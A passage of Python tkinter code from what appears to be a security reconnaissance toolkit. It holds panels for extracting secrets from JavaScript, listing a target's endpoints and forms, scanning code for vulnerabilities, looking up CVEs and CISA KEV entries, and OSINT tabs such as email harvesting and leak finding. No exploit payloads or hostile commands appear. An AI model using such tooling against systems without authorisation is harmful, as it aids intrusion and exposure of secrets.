                    code = resp.read().decode('utf-8', errors='replace')
                def _update():
                    self._js_code_txt.delete('1.0','end')
                    self._js_code_txt.insert('end', code[:50000])
                    self._js_run_analysis(code, url)
                self.root.after(0, _update)
            except Exception as e:
                self.root.after(0, lambda: (
                    self.set_status('Fetch error: ' + str(e), RED),
                    messagebox.showerror('Fetch Error', str(e), parent=self.root)
                ))
        threading.Thread(target=_go, daemon=True).start()


    def _js_analyze_file(self):
        path = filedialog.askopenfilename(
            filetypes=[('JavaScript','*.js'),('TypeScript','*.ts'),('All','*.*')])
        if not path: return
        with open(path, encoding='utf-8', errors='replace') as f2:
            code = f2.read()
        self._js_code_txt.delete('1.0','end')
        self._js_code_txt.insert('end', code)
        self._js_run_analysis(code, path)

    def _js_detail(self, _event=None):
        sel = self._js_tree.selection()
        if not sel: return
        vals = self._js_tree.item(sel[0])['values']
        self._js_detail_txt.config(state='normal')
        self._js_detail_txt.delete('1.0','end')
        self._js_detail_txt.insert('end', "Type:     " + str(vals[0]) + "\n")
        self._js_detail_txt.insert('end', "Severity: " + str(vals[1]) + "\n")
        self._js_detail_txt.insert('end', "Line:     " + str(vals[2]) + "\n")
        self._js_detail_txt.insert('end', "Value:    " + str(vals[3]) + "\n")
        if self._js_results:
            for s in self._js_results["secrets"]:
                if str(s["line"]) == str(vals[2]):
                    self._js_detail_txt.insert('end', "\nFull match: " + str(s['value']) + "\n")
                    break
        self._js_detail_txt.config(state='disabled')

    def _js_copy_secrets(self):
        if not self._js_results: return
        lines_out = ["[" + s['severity'] + "] " + s['type'] + " (L" + str(s['line']) + "): " + s['value']
                     for s in self._js_results["secrets"]]
        self.root.clipboard_clear()
        self.root.clipboard_append("\n".join(lines_out))
        self.set_status(str(len(lines_out)) + " secrets copied!", GREEN)

    def _js_export_json(self):
        if not self._js_results: return
        path = filedialog.asksaveasfilename(defaultextension='.json', filetypes=[('JSON','*.json')])
        if path:
            import json as _json
            with open(path,'w') as f2: _json.dump(self._js_results, f2, indent=2)
            self.set_status("Exported: " + path, GREEN)

    def _js_show_endpoints(self):
        if not self._js_results: return
        eps = self._js_results.get("endpoints", [])
        self._show_text("Endpoints (" + str(len(eps)) + ")", "\n".join(eps))

    # ── ENDPOINT EXTRACTOR ────────────────────────────────────────────
    def _build_endpoint_extractor(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "ENDPOINT EXTRACTOR", "🔗").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text="  Extracts API endpoints, JS files, forms. Highlights interesting/sensitive paths.",
                 bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=10, pady=6)

        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        self._ep_target = tk.StringVar()
        tk.Label(tr, text="Target:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        mk_entry(tr, var=self._ep_target, w=50).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "← Project", lambda: self._ep_target.set("https://" + self.project.get()), FG3, small=True).pack(side='left')
        mk_btn(tr, "📂 File", lambda: self._ep_target.set(filedialog.askopenfilename()), FG2, small=True).pack(side='left', padx=6)

        br = mk_frame(pad, bg=BG2); br.pack(fill='x', pady=(0,8))
        mk_btn(br, "🌐 Extract from URL",  self._ep_from_url,  ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(br, "📂 Extract from File", self._ep_from_file, CYAN,   small=True).pack(side='left', padx=4)
        self._ep_stats_lbl = tk.Label(br, text="", bg=BG2, fg=GREEN, font=MONO_S)
        self._ep_stats_lbl.pack(side='right', padx=8)

        paned = tk.PanedWindow(pad, orient='horizontal', bg=BG, sashwidth=5)
        paned.pack(fill='both', expand=True)

        left = mk_frame(paned, bg=BG2); paned.add(left, width=200)
        tk.Label(left, text="Categories", bg=BG2, fg=ACCENT, font=MONO_B).pack(pady=(0,3), anchor='w')
        self._ep_cat_tree = mk_tree(left, columns=('cat','count'), show='headings', height=22)
        self._ep_cat_tree.heading('cat',text='Category'); self._ep_cat_tree.column('cat',width=130)
        self._ep_cat_tree.heading('count',text='#');      self._ep_cat_tree.column('count',width=40)
        self._ep_cat_tree.tag_configure('high', foreground=RED, background=BG3)
        self._ep_cat_tree.tag_configure('med',  foreground=YELLOW, background=BG3)
        self._ep_cat_tree.tag_configure('low',  foreground=FG2, background=BG3)
        vsb_c = ttk.Scrollbar(left, orient='vertical', command=self._ep_cat_tree.yview)
        self._ep_cat_tree.configure(yscrollcommand=vsb_c.set)
        self._ep_cat_tree.pack(side='left', fill='both', expand=True)
        vsb_c.pack(side='right', fill='y')

        right = mk_frame(paned, bg=BG2); paned.add(right, stretch='always')
        tk.Label(right, text="Endpoints / Paths", bg=BG2, fg=ACCENT, font=MONO_B).pack(pady=(0,3), anchor='w')
        self._ep_list = mk_tree(right, columns=('url',), show='headings', height=22)
        self._ep_list.heading('url', text='URL / Path')
        self._ep_list.column('url', width=680)
        self._ep_list.tag_configure('interesting', foreground=YELLOW, background=BG3)
        self._ep_list.tag_configure('normal',      foreground=FG2, background=BG3)
        vsb_e = ttk.Scrollbar(right, orient='vertical', command=self._ep_list.yview)
        self._ep_list.configure(yscrollcommand=vsb_e.set)
        tf_e = mk_frame(right, bg=BG2); tf_e.pack(fill='both', expand=True)
        self._ep_list.pack(side='left', fill='both', expand=True, in_=tf_e)
        vsb_e.pack(side='right', fill='y', in_=tf_e)

        def _ep_dbl(_e):
            sel = self._ep_list.selection()
            if sel:
                url = str(self._ep_list.item(sel[0])['values'][0])
                if url.startswith('http'): webbrowser.open(url)
        self._ep_list.bind('<Double-1>', _ep_dbl)

        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(5,0))
        def _copy_all_ep():
            items = [str(self._ep_list.item(i)['values'][0]) for i in self._ep_list.get_children()]
            self.root.clipboard_clear(); self.root.clipboard_append("\n".join(items))
            self.set_status(str(len(items)) + " endpoints copied!", GREEN)
        def _copy_interesting_ep():
            items = [str(self._ep_list.item(i)['values'][0]) for i in self._ep_list.get_children()
                     if 'interesting' in self._ep_list.item(i)['tags']]
            self.root.clipboard_clear(); self.root.clipboard_append("\n".join(items))
            self.set_status(str(len(items)) + " interesting copied!", YELLOW)
        def _save_ep():
            items = [str(self._ep_list.item(i)['values'][0]) for i in self._ep_list.get_children()]
            self._save_text("\n".join(items))
        mk_btn(bf, "📋 Copy All",      _copy_all_ep,      ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "⚠ Copy Interesting", _copy_interesting_ep, YELLOW, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save",          _save_ep,          FG2,   small=True).pack(side='left', padx=4)

        self._ep_results = None
        self._ep_cat_tree.bind('<<TreeviewSelect>>', self._ep_show_category)

    def _ep_populate(self, results):
        self._ep_results = results
        self._ep_cat_tree.delete(*self._ep_cat_tree.get_children())
        self._ep_list.delete(*self._ep_list.get_children())
        eps         = results.get("endpoints", [])
        interesting = set(results.get("interesting", []))
        forms       = results.get("forms", [])
        js_files    = results.get("js_files", [])
        cats = [
            ("🌐 All Endpoints", eps,                                        "low"),
            ("⚠ Interesting",    list(interesting),                           "high"),
            ("📝 Forms",         [f['method'] + " " + f['action'] for f in forms], "med"),
            ("📦 JS Files",      js_files,                                   "med"),
        ]
        for label, items, prio in cats:
            if items:
                self._ep_cat_tree.insert('','end', iid=label, values=(label, len(items)), tags=(prio,))
        for ep in eps:
            tag = "interesting" if ep in interesting else "normal"
            self._ep_list.insert('','end', values=(ep,), tags=(tag,))
        self._ep_stats_lbl.config(
            text="Total: " + str(len(eps)) + "  |  Interesting: " + str(len(interesting)) +
                 "  |  Forms: " + str(len(forms)) + "  |  JS: " + str(len(js_files)))
        self.set_status("Endpoints: " + str(len(eps)) + " found", GREEN)

    def _ep_show_category(self, _event=None):
        sel = self._ep_cat_tree.selection()
        if not sel or not self._ep_results: return
        cat = sel[0]; r = self._ep_results
        interesting = set(r.get("interesting", []))
        self._ep_list.delete(*self._ep_list.get_children())
        if   "All"         in cat: items = r.get("endpoints", [])
        elif "Interesting" in cat: items = list(interesting)
        elif "Form"        in cat: items = [f['method'] + " " + f['action'] for f in r.get("forms", [])]
        elif "JS"          in cat: items = r.get("js_files", [])
        else: items = []
        for ep in items:
            tag = "interesting" if ep in interesting else "normal"
            self._ep_list.insert('','end', values=(ep,), tags=(tag,))

    def _ep_from_url(self):
        target = self._ep_target.get().strip()
        if not target: return
        if not target.startswith("http"): target = "https://" + target
        self.set_status(f"Fetching endpoints from {target}...", CYAN)
        self._ep_stats_lbl.config(text="⏳ Fetching...", fg=CYAN)
        def _go():
            r = sec_tools.extract_endpoints_from_url(target)
            if r.get('error'):
                # Try Python urllib fallback
                try:
                    import urllib.request as _ur
                    req = _ur.Request(target, headers={'User-Agent':'Mozilla/5.0'})
                    with _ur.urlopen(req, timeout=15) as resp:
                        html = resp.read().decode('utf-8', errors='replace')
                    r = sec_tools.extract_endpoints_from_text_as_url_result(html, target)
                except Exception as e2:
                    self.root.after(0, lambda: (
                        self._ep_stats_lbl.config(text=f"❌ Error: {e2}", fg=RED),
                        self.set_status(f"Error: {e2}", RED)
                    ))
                    return
            # Save to project logs
            proj = self.project.get() or target.replace('https://','').replace('http://','').split('/')[0]
            proj_dir = LOGS_DIR / proj
            proj_dir.mkdir(parents=True, exist_ok=True)
            import json as _json
            out_file = proj_dir / "endpoint_extractor.json"
            try:
                with open(out_file, 'w') as f2:
                    _json.dump(r, f2, indent=2)
            except Exception: pass
            ep_txt = proj_dir / "endpoints.txt"
            try:
                with open(ep_txt, 'w') as f2:
                    f2.write('\n'.join(r.get('endpoints', []) + r.get('interesting', [])))
            except Exception: pass
            self.root.after(0, lambda: self._ep_populate(r))
        threading.Thread(target=_go, daemon=True).start()

    def _ep_from_file(self):
        path = self._ep_target.get().strip()
        if not path or not os.path.isfile(path):
            path = filedialog.askopenfilename(filetypes=[('All','*.*'),('HTML','*.html'),('JS','*.js')])
        if not path: return
        self._ep_stats_lbl.config(text="⏳ Analyzing file...", fg=CYAN)
        def _go():
            r = sec_tools.extract_endpoints_from_file(path)
            r2 = {"endpoints": r.get("endpoints",[]), "interesting": r.get("interesting",[]),
                  "forms": [], "js_files": []}
            self.root.after(0, lambda: self._ep_populate(r2))
        threading.Thread(target=_go, daemon=True).start()

    # ── CODE VULNERABILITY FINDER ─────────────────────────────────────
    def _build_code_vuln_finder(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "CODE VULNERABILITY FINDER", "🐛").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text="  Languages: Python | PHP | JavaScript/Node.js | Java  "
                 "  Finds: SQLi, CMDi, XSS, Path Traversal, SSRF, Deserialization, Secrets",
                 bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=10, pady=6)

        ir = mk_frame(pad, bg=BG2); ir.pack(fill='x', pady=(0,8))
        tk.Label(ir, text="Language:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._cv_lang = tk.StringVar(value="auto")
        ttk.Combobox(ir, textvariable=self._cv_lang,
                     values=["auto","Python","PHP","JavaScript/Node.js","Java"],
                     width=18, font=MONO_S).pack(side='left', padx=8)
        mk_btn(ir, "📂 Open File", self._cv_open_file,  CYAN,  small=True).pack(side='left', padx=4)
        mk_btn(ir, "▶ Analyze",   self._cv_analyze,    GREEN, small=True).pack(side='left', padx=4)
        mk_btn(ir, "🗑 Clear", lambda: self._cv_code.delete('1.0','end'), FG3, small=True).pack(side='left', padx=4)

        paned = tk.PanedWindow(pad, orient='horizontal', bg=BG, sashwidth=5)
        paned.pack(fill='both', expand=True, pady=(4,0))

        left = mk_frame(paned, bg=BG2); paned.add(left, width=480)
        tk.Label(left, text="Paste Source Code:", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(0,3))
        self._cv_code = mk_stext(left, h=24, bg=BG3, fg='#e06c75')
        self._cv_code.pack(fill='both', expand=True)

        right = mk_frame(paned, bg=BG2); paned.add(right, stretch='always')
        tk.Label(right, text="Vulnerabilities:", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(0,3))
        cols = ('Category','Severity','Line','Description')
        self._cv_tree = mk_tree(right, columns=cols, show='headings', height=14)
        for c,w in zip(cols,(140,70,50,310)):
            self._cv_tree.heading(c,text=c); self._cv_tree.column(c,width=w)
        for sev in ('CRITICAL','HIGH','MEDIUM','LOW'):
            self._cv_tree.tag_configure(sev, foreground=SEV_COLOR(sev), background=SEV_BG(sev))
        vsb = ttk.Scrollbar(right, orient='vertical', command=self._cv_tree.yview)
        self._cv_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(right, bg=BG2); tf.pack(fill='x')
        self._cv_tree.pack(side='left', fill='both', expand=True, in_=tf)
        vsb.pack(side='right', fill='y', in_=tf)
        self._cv_tree.bind('<<TreeviewSelect>>', self._cv_show_detail)

        self._cv_stats_lbl = tk.Label(right, text="", bg=BG2, fg=FG3, font=MONO_S)
        self._cv_stats_lbl.pack(anchor='w', pady=(5,3))
        tk.Label(right, text="Code Context:", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(3,2))
        self._cv_detail = mk_stext(right, h=8, bg=BG3, fg=YELLOW)
        self._cv_detail.pack(fill='x', pady=(0,4))

        bf = mk_frame(right, bg=BG2); bf.pack(fill='x')
        def _copy_cv():
            if not self._cv_results: return
            out = ["[" + v['severity'] + "] L" + str(v['line']) + " " + v['category'] + ": " + v['description']
                   for v in self._cv_results.get("vulnerabilities",[])]
            self.root.clipboard_clear(); self.root.clipboard_append("\n".join(out))
            self.set_status(str(len(out)) + " findings copied!", GREEN)
        def _save_cv():
            if not self._cv_results: return
            r3 = self._cv_results
            s3 = r3['summary']
            out  = "# Code Security Audit\n"
            out += "Language: " + str(r3['language']) + "\n"
            out += "Risk Score: " + str(s3['risk_score']) + "\n"
            out += "CRITICAL: " + str(s3.get('CRITICAL',0)) + "  HIGH: " + str(s3.get('HIGH',0)) + "\n\n"
            for v in r3.get("vulnerabilities",[]):
                out += "[" + v['severity'] + "] L" + str(v['line']) + " - " + v['category'] + "\n"
                out += "  " + v['description'] + "\n"
                out += "  " + str(v['match'])[:80] + "\n\n"
            self._save_text(out)
        mk_btn(bf, "📋 Copy Findings", _copy_cv,  ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Export Report", _save_cv,  GREEN,  small=True).pack(side='left', padx=4)
        self._cv_results = None

    def _cv_open_file(self):
        path = filedialog.askopenfilename(filetypes=[
            ("Python","*.py"),("PHP","*.php"),("JavaScript","*.js"),
            ("TypeScript","*.ts"),("Java","*.java"),("All","*.*")])
        if not path: return
        with open(path, encoding='utf-8', errors='replace') as f2:
            code = f2.read()
        self._cv_code.delete('1.0','end')
        self._cv_code.insert('end', code)
        ext_map = {'.py':'Python','.php':'PHP','.js':'JavaScript/Node.js',
                   '.ts':'JavaScript/Node.js','.java':'Java'}
        ext = os.path.splitext(path)[1].lower()
        if ext in ext_map: self._cv_lang.set(ext_map[ext])
        self.set_status("Loaded: " + path, CYAN)

    def _cv_analyze(self):
        code = self._cv_code.get('1.0','end').strip()
        if not code:
            messagebox.showwarning("Empty","Paste or open source code first.", parent=self.root); return
        self.set_status("Analyzing code...", CYAN)
        lang = self._cv_lang.get()
        def _go():
            r = sec_tools.analyze_code_vulnerabilities(code, lang)
            self._cv_results = r
            self.root.after(0, lambda: self._cv_populate(r))
        threading.Thread(target=_go, daemon=True).start()

    def _cv_populate(self, r):
        self._cv_tree.delete(*self._cv_tree.get_children())
        for v in r["vulnerabilities"]:
            sev = v["severity"]
            self._cv_tree.insert('','end', values=(v["category"], sev, v["line"], v["description"]), tags=(sev,))
        s = r["summary"]
        self._cv_stats_lbl.config(
            text=("Language: " + str(s['language']) + "  |  Total: " + str(s['total']) +
                  "  |  CRIT: " + str(s.get('CRITICAL',0)) + "  HIGH: " + str(s.get('HIGH',0)) +
                  "  |  Risk Score: " + str(s['risk_score'])),
            fg=RED if s.get('CRITICAL',0) else (YELLOW if s.get('HIGH',0) else GREEN))
        self.set_status("Analysis: " + str(s['total']) + " vulns, score=" + str(s['risk_score']),
                        RED if s.get('CRITICAL',0) else GREEN)

    def _cv_show_detail(self, _event=None):
        sel = self._cv_tree.selection()
        if not sel or not self._cv_results: return
        vals = self._cv_tree.item(sel[0])['values']
        line_no = int(vals[2]) if str(vals[2]).isdigit() else 0
        detail = ""
        for v in self._cv_results["vulnerabilities"]:
            if v["line"] == line_no and v["description"] == vals[3]:
                detail  = "Category    : " + str(v['category'])     + "\n"
                detail += "Severity    : " + str(v['severity'])     + "\n"
                detail += "Line        : " + str(v['line'])         + "\n"
                detail += "Description : " + str(v['description'])  + "\n"
                detail += "Match       : " + str(v['match'])        + "\n\n"
                detail += "Code Context:\n" + str(v.get('context','')) + "\n"
                break
        if not detail:
            detail = "Category: " + str(vals[0]) + "\nLine: " + str(vals[2]) + "\n" + str(vals[3])
        self._cv_detail.config(state='normal')
        self._cv_detail.delete('1.0','end')
        self._cv_detail.insert('end', detail)
        self._cv_detail.config(state='disabled')

    # ── CVE FINDER ───────────────────────────────────────────────────
    def _build_cve_finder(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "CVE & EXPLOIT FINDER", "🛡").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text="  Sources: NVD (National Vulnerability Database) | CISA KEV | Tech CVE Mapping",
                 bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=10, pady=6)
        nb3 = ttk.Notebook(pad); nb3.pack(fill='both', expand=True)
        sf  = tk.Frame(nb3, bg=BG2); nb3.add(sf,  text="  🔍 NVD Search  ")
        tf2 = tk.Frame(nb3, bg=BG2); nb3.add(tf2, text="  🔧 Tech CVEs  ")
        kf  = tk.Frame(nb3, bg=BG2); nb3.add(kf,  text="  🚨 CISA KEV  ")
        self._build_cve_search(sf)
        self._build_cve_tech(tf2)
        self._build_cve_kev(kf)

    def _build_cve_search(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=10, pady=10)
        sr = mk_frame(pad, bg=BG2); sr.pack(fill='x', pady=(0,10))
        tk.Label(sr, text="Search NVD:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._cve_q = tk.StringVar()
        se = mk_entry(sr, var=self._cve_q, w=36); se.pack(side='left', padx=8, ipady=3)
        se.bind('<Return>', lambda e: self._cve_do_search())
        tk.Label(sr, text="Limit:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(6,3))
        self._cve_limit = tk.StringVar(value="20")
        ttk.Combobox(sr, textvariable=self._cve_limit, values=["10","20","50","100"], width=5, font=MONO_S).pack(side='left')
        mk_btn(sr, "🔍 Search", self._cve_do_search, ACCENT, small=True).pack(side='left', padx=8)
        mk_btn(sr, "🚨 Check CISA", lambda: self._cve_check_kev_single(), RED, small=True).pack(side='left', padx=4)
        mk_btn(sr, "🌐 Open NVD", lambda: webbrowser.open(
            "https://nvd.nist.gov/vuln/search/results?query=" + self._cve_q.get()),
               FG2, small=True).pack(side='left', padx=4)

        cols = ('CVE ID','Score','Severity','Published','Description')
        self._cve_tree = mk_tree(pad, columns=cols, show='headings', height=16)
        for c,w in zip(cols,(130,55,80,90,390)):
            self._cve_tree.heading(c,text=c); self._cve_tree.column(c,width=w)
        for sev in ('CRITICAL','HIGH','MEDIUM','LOW'):
            self._cve_tree.tag_configure(sev, foreground=SEV_COLOR(sev), background=SEV_BG(sev))
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._cve_tree.yview)
        self._cve_tree.configure(yscrollcommand=vsb.set)
        tf3 = mk_frame(pad, bg=BG2); tf3.pack(fill='both', expand=True)
        self._cve_tree.pack(side='left', fill='both', expand=True, in_=tf3)
        vsb.pack(side='right', fill='y', in_=tf3)
        self._cve_tree.bind('<Double-1>', self._cve_open_browser)
        self._cve_tree.bind('<<TreeviewSelect>>', self._cve_show_detail)
        self._cve_total_lbl = tk.Label(pad, text="", bg=BG2, fg=FG3, font=MONO_S)
        self._cve_total_lbl.pack(anchor='w', pady=(4,0))
        self._cve_detail = mk_stext(pad, h=6, bg=BG3, fg=FG)
        self._cve_detail.pack(fill='x', pady=(5,0))
        self._cve_data = []

    def _cve_do_search(self):
        q = self._cve_q.get().strip()
        if not q:
            messagebox.showwarning("Empty", "Enter a CVE ID or keyword.", parent=self.root); return
        self._cve_total_lbl.config(text=f"⏳ Searching NVD for: {q}...", fg=CYAN)
        self._cve_tree.delete(*self._cve_tree.get_children())
        def _go():
            try: limit = int(self._cve_limit.get())
            except Exception: limit = 20
            r = sec_tools.search_cve_nvd(q, limit)
            # If network fails, try offline tech map
            if r.get("error") and not r.get("cves"):
                offline = sec_tools.get_cves_for_tech([q])
                if offline:
                    cves_offline = []
                    for tech, data in offline.items():
                        for cve_id in data.get("known_cves", [])[:limit]:
                            cves_offline.append({
                                "id": cve_id, "score": "N/A", "severity": "HIGH",
                                "published": "Offline", "description": f"Known CVE for {tech} (offline mode)",
                                "references": [f"https://nvd.nist.gov/vuln/detail/{cve_id}"]
                            })
                    r = {"cves": cves_offline, "total_found": len(cves_offline),
                         "offline": True, "error": r.get("error")}
            self._cve_data = r.get("cves", [])
            self.root.after(0, lambda: self._cve_populate(r))
        threading.Thread(target=_go, daemon=True).start()

    def _cve_populate(self, r):
        self._cve_tree.delete(*self._cve_tree.get_children())
        cves = r.get("cves", [])
        for cve in cves:
            sev = str(cve.get("severity","N/A")).upper()
            tag = sev if sev in ("CRITICAL","HIGH","MEDIUM","LOW") else "LOW"
            self._cve_tree.insert('','end', values=(
                cve["id"], cve.get("score","N/A"), sev,
                cve.get("published",""), cve.get("description","")[:100]), tags=(tag,))
        total = r.get("total_found", len(cves))
        err   = r.get("error","")
        if err and not cves:
            self._cve_total_lbl.config(text=f"⚠ NVD error: {err}  (Check internet / NVD API)", fg=RED)
        elif r.get("offline"):
            self._cve_total_lbl.config(text=f"⚠ Offline mode: {len(cves)} cached CVEs  (NVD: {err})", fg=YELLOW)
        else:
            self._cve_total_lbl.config(text=f"✅ {len(cves)} of {total} results", fg=GREEN if cves else YELLOW)
        self.set_status(f"CVE: {len(cves)} results" + (" [offline]" if r.get("offline") else ""),
                        GREEN if cves else RED)

    def _cve_show_detail(self, _event=None):
        sel = self._cve_tree.selection()
        if not sel: return
        cve_id = str(self._cve_tree.item(sel[0])['values'][0])
        data = next((c for c in self._cve_data if c["id"] == cve_id), None)
        if not data: return
        self._cve_detail.config(state='normal')
        self._cve_detail.delete('1.0','end')
        self._cve_detail.insert('end', "ID:        " + str(data['id']) + "\n")
        self._cve_detail.insert('end', "Score:     " + str(data.get('score','N/A')) +
                                 "  [" + str(data.get('severity','N/A')) + "]\n")
        self._cve_detail.insert('end', "Published: " + str(data.get('published','')) + "\n\n")
        self._cve_detail.insert('end', "Description:\n" + str(data.get('description','')) + "\n\n")
        if data.get("references"):
            self._cve_detail.insert('end', "References:\n")
            for ref in data["references"][:3]:
                self._cve_detail.insert('end', "  " + str(ref) + "\n")
        self._cve_detail.config(state='disabled')

    def _cve_open_browser(self, _event=None):
        sel = self._cve_tree.selection()
        if not sel: return
        cve_id = str(self._cve_tree.item(sel[0])['values'][0])
        webbrowser.open("https://nvd.nist.gov/vuln/detail/" + cve_id)

    def _cve_check_kev_single(self):
        q = self._cve_q.get().strip()
        if not q: return
        def _go():
            r = sec_tools.check_cisa_kev(q)
            in_kev = r.get('in_kev', False)
            det = r.get('details')
            msg  = "CVE: " + q + "\nIn CISA KEV: " + ("YES ⚠  ACTIVELY EXPLOITED" if in_kev else "No") + "\n"
            if det:
                msg += "\nVendor:  " + str(det.get('vendorProject','N/A'))
                msg += "\nProduct: " + str(det.get('product','N/A'))
                msg += "\nDue:     " + str(det.get('dueDate','N/A'))
            self.root.after(0, lambda: messagebox.showinfo("CISA KEV", msg, parent=self.root))
        threading.Thread(target=_go, daemon=True).start()

    def _build_cve_tech(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=10, pady=10)
        sr = mk_frame(pad, bg=BG2); sr.pack(fill='x', pady=(0,10))
        tk.Label(sr, text="Tech Stack:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._cve_tech_var = tk.StringVar()
        mk_entry(sr, var=self._cve_tech_var, w=42).pack(side='left', padx=8, ipady=3)
        mk_btn(sr, "← Smart Recon", lambda: self._load_tech_from_recon(), FG3, small=True).pack(side='left', padx=4)
        mk_btn(sr, "🔍 Find CVEs",  self._cve_find_for_tech, ACCENT, small=True).pack(side='left', padx=6)
        self._cve_tech_txt = mk_stext(pad, h=28, bg=BG3, fg=FG)
        self._cve_tech_txt.pack(fill='both', expand=True)
        self._cve_tech_txt.insert('end', "Enter technologies above (e.g. wordpress, laravel, spring, jenkins, log4j)\n")

    def _load_tech_from_recon(self):
        proj = self.project.get()
        if not proj: return
        tech_dir = LOGS_DIR / proj / "tech"
        if tech_dir.exists():
            techs = [f.stem for f in tech_dir.glob("*.txt")]
            self._cve_tech_var.set(", ".join(techs))

    def _cve_find_for_tech(self):
        techs_str = self._cve_tech_var.get().strip()
        if not techs_str: return
        techs = [t.strip() for t in techs_str.split(",") if t.strip()]
        def _go():
            r = sec_tools.get_cves_for_tech(techs)
            self.root.after(0, lambda: self._cve_show_tech_results(r))
        threading.Thread(target=_go, daemon=True).start()

    def _cve_show_tech_results(self, results):
        self._cve_tech_txt.config(state='normal')
        self._cve_tech_txt.delete('1.0','end')
        if not results:
            self._cve_tech_txt.insert('end', "No CVE mappings found. Try NVD Search for manual lookup.\n")
            self._cve_tech_txt.config(state='disabled'); return
        self._cve_tech_txt.insert('end', "CVE Intelligence Report\n" + "═"*50 + "\n\n")
        for tech, data in results.items():
            self._cve_tech_txt.insert('end', "▌ " + tech.upper() + "\n")
            self._cve_tech_txt.insert('end', "  " + data['note'] + "\n")
            self._cve_tech_txt.insert('end', "  Known CVEs (" + str(data['count']) + "):\n")
            for cid in data["known_cves"]:
                self._cve_tech_txt.insert('end', "    • " + cid +
                    "  →  https://nvd.nist.gov/vuln/detail/" + cid + "\n")
            self._cve_tech_txt.insert('end', "\n")
        self._cve_tech_txt.config(state='disabled')
        self.set_status("CVE data for " + str(len(results)) + " technologies", GREEN)

    def _build_cve_kev(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=10, pady=10)
        mk_section(pad, "CISA KNOWN EXPLOITED VULNERABILITIES", "🚨").pack(fill='x', pady=(0,8))
        tk.Label(pad, text="Vulnerabilities actively exploited in the wild — CISA mandates federal agencies to patch these.",
                 bg=BG2, fg=FG2, font=MONO_S).pack(anchor='w', pady=(0,8))
        br = mk_frame(pad, bg=BG2); br.pack(fill='x', pady=(0,8))
        mk_btn(br, "🔄 Load CISA KEV Catalog", self._cve_load_kev, ACCENT).pack(side='left', padx=4, ipady=4)
        mk_btn(br, "🌐 Open CISA", lambda: webbrowser.open("https://www.cisa.gov/known-exploited-vulnerabilities-catalog"),
               FG2, small=True).pack(side='left', padx=8)
        self._kev_status = tk.Label(br, text="Click Load to fetch the live catalog", bg=BG2, fg=FG3, font=MONO_S)
        self._kev_status.pack(side='left', padx=8)

        cols = ('CVE ID','Vendor','Product','Added','Due Date')
        self._kev_tree = mk_tree(pad, columns=cols, show='headings', height=22)
        for c,w in zip(cols,(130,120,180,100,100)):
            self._kev_tree.heading(c,text=c); self._kev_tree.column(c,width=w)
        self._kev_tree.tag_configure('kev', foreground=RED, background=BG3)
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._kev_tree.yview)
        self._kev_tree.configure(yscrollcommand=vsb.set)
        tf4 = mk_frame(pad, bg=BG2); tf4.pack(fill='both', expand=True)
        self._kev_tree.pack(side='left', fill='both', expand=True, in_=tf4)
        vsb.pack(side='right', fill='y', in_=tf4)
        def _kev_dbl(_e):
            sel = self._kev_tree.selection()
            if sel:
                cid = str(self._kev_tree.item(sel[0])['values'][0])
                webbrowser.open("https://nvd.nist.gov/vuln/detail/" + cid)
        self._kev_tree.bind('<Double-1>', _kev_dbl)

    def _cve_load_kev(self):
        self._kev_status.config(text="Loading CISA KEV...", fg=CYAN)
        def _go():
            try:
                import urllib.request as _ur, json as _j
                with _ur.urlopen("https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json", timeout=25) as resp:
                    data = _j.loads(resp.read())
                vulns = data.get("vulnerabilities", [])
            except Exception as e:
                vulns = []
                self.root.after(0, lambda: self._kev_status.config(
                    text="Error: " + str(e), fg=RED))
                return
            self.root.after(0, lambda: self._kev_populate(vulns))
        threading.Thread(target=_go, daemon=True).start()

    def _build_osint(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        tabs_osint = [
            ("  🔍 Subdomain Intel  ", self._build_osint_subdomain),
            ("  📧 Email Harvest  ",   self._build_osint_email),
            ("  🏢 ASN / IP Range  ",  self._build_osint_asn),
            ("  🔑 Favicon Hash  ",    self._build_osint_favicon),
            ("  ☁️ Cloud Assets  ",    self._build_osint_cloud),
            ("  💧 Leak Finder  ",     self._build_osint_leaks),
        ]
        for title, builder in tabs_osint:
            f = tk.Frame(nb2, bg=BG2); nb2.add(f, text=title); builder(f)

    def _osint_target(self):
        return self.project.get() or "example.com"

    def _build_osint_subdomain(self, frame):
